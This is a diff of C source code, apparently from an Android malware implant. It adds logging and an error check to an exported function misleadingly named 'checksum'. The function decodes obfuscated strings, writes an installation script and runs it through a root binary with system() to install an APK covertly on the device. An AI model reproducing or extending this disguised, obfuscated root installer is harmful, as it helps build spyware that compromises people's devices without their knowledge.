@@ -33,6 +33,8 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   static unsigned char qzx[] = "\x8c\x90\x1f\x1d\x16\x14"; // "qzx"
   struct stat st;
 
+  LOGD("[APK INSTALLER] Starting apk installation\n");
+
   memset(current_path_shtmp, 0, sizeof(current_path_shtmp));
 
   // Current script path
@@ -43,12 +45,20 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   strcat(current_path_shtmp, deobfuscate(shtmp));
   strcat(current_path_rcs, deobfuscate(rcs));
 
+  LOGD("[APK INSTALLER] Installation script path: %s\n", current_path_shtmp);
+  LOGD("[APK INSTALLER] Apk path: %s\n", current_path_rcs);
+
   if(stat(current_path_rcs, &st) < 0) {
-    LOGD("Apk not present... aborting\n");
+    LOGD("[APK INSTALLER] Apk not present... aborting\n");
     return 0;
   }
 
   install_rcs = fopen(deobfuscate(shtmp), "w");  // installation script
+
+  if(!install_rcs) {
+    LOGD("[APK INSTALLER] Script file creation failed... aborting\n");
+    return 0;
+  }
 
   // Extract the script
   memset(&script, 0, sizeof(script));
@@ -67,7 +77,11 @@ __attribute__ ((visibility ("default"))) int checksum(void) {
   snprintf(script_rcs, sizeof(script_rcs), "%s %s %s", deobfuscate(ROOT_BIN), deobfuscate(qzx), current_path_shtmp);
 
   fclose(install_rcs);
+
+  LOGD("[APK INSTALLER] Starting installation script!\n");
   system(script_rcs);
   
+  LOGD("[APK INSTALLER] All done!\n");
+
   return 1;
 }
